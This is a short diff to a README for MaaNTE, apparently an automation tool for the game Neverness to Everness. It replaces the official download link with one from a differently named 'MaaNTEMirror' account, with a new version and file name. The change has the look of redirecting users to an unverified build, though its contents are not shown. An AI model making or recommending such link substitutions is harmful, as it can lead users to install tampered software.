@@ -10,7 +10,7 @@ For players searching **neverness to everness maa** tooling, MaaNTE is the **nte
 
 
 ## Install
-[Download `MaaNTE.zip`](https://github.com/maante/MaaNTE/releases/download/v1.1.0/MaaNTE-v1.1.0.zip)
+[Download `MaaNTE.zip`](https://github.com/MaaNTEMirror/MaaNTE/releases/download/v1.3.0/MaaNTE.zip)
 ---
 
 <img width="686" height="386" alt="images2" src="https://github.com/user-attachments/assets/fd071704-f504-4f96-b44a-fea8eacd1005" />
